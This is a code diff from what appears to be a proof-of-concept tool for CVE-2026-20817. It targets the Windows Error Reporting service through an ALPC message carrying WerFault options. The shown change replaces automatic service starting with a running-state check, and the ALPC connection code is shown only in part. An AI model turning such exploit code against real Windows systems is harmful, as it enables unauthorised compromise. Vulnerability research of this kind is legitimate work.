@@ -66,7 +66,7 @@ static bool NtSuccess(NTSTATUS status)
     return status >= 0;
 }
 
-static bool EnsureWerSvcRunning()
+static bool IsWerSvcRunning()
 {
     SC_HANDLE manager = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
     if (!manager) {
@@ -74,13 +74,9 @@ static bool EnsureWerSvcRunning()
         return false;
     }
 
-    SC_HANDLE service = OpenServiceW(
-        manager, L"WerSvc", SERVICE_QUERY_STATUS | SERVICE_START);
+    SC_HANDLE service = OpenServiceW(manager, L"WerSvc", SERVICE_QUERY_STATUS);
     if (!service) {
-        const DWORD error = GetLastError();
-        wprintf(L"[-] OpenServiceW(WerSvc) failed: %lu\n", error);
-        if (error == ERROR_ACCESS_DENIED)
-            wprintf(L"[!] Start the service from an elevated console: sc start WerSvc\n");
+        wprintf(L"[-] OpenServiceW(WerSvc) failed: %lu\n", GetLastError());
         CloseServiceHandle(manager);
         return false;
     }
@@ -96,33 +92,9 @@ static bool EnsureWerSvcRunning()
         return false;
     }
 
-    if (status.dwCurrentState != SERVICE_RUNNING) {
-        wprintf(L"[*] WerSvc is not running. Starting the service...\n");
-        if (!StartServiceW(service, 0, nullptr) &&
-            GetLastError() != ERROR_SERVICE_ALREADY_RUNNING) {
-            const DWORD error = GetLastError();
-            wprintf(L"[-] StartServiceW(WerSvc) failed: %lu\n", error);
-            if (error == ERROR_ACCESS_DENIED)
-                wprintf(L"[!] Start it from an elevated console: sc start WerSvc\n");
-            CloseServiceHandle(service);
-            CloseServiceHandle(manager);
-            return false;
-        }
-
-        const ULONGLONG deadline = GetTickCount64() + 10000;
-        do {
-            Sleep(200);
-            if (!QueryServiceStatusEx(service, SC_STATUS_PROCESS_INFO,
-                                      reinterpret_cast<BYTE*>(&status), sizeof(status),
-                                      &bytesNeeded))
-                break;
-        } while (status.dwCurrentState != SERVICE_RUNNING &&
-                 GetTickCount64() < deadline);
-    }
-
     const bool running = status.dwCurrentState == SERVICE_RUNNING;
-    wprintf(running ? L"[+] WerSvc is running.\n"
-                    : L"[-] WerSvc did not reach SERVICE_RUNNING.\n");
+    wprintf(L"[+] WerSvc service state: 0x%lx pid=%lu\n",
+            status.dwCurrentState, status.dwProcessId);
     CloseServiceHandle(service);
     CloseServiceHandle(manager);
     return running;
@@ -174,8 +146,10 @@ int wmain(int argc, wchar_t** argv)
     const wchar_t* options = argc > 1 ? argv[1] : L"SG_CVE_2026_20817_TEST";
     wprintf(L"[*] WerFault options: %s\n", options);
 
-    if (!EnsureWerSvcRunning())
+    if (!IsWerSvcRunning()) {
+        wprintf(L"[-] WerSvc service is not running; start it before sending the ALPC message\n");
         return 1;
+    }
 
     HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
     const auto NtAlpcConnectPort = reinterpret_cast<NtAlpcConnectPort_t>(
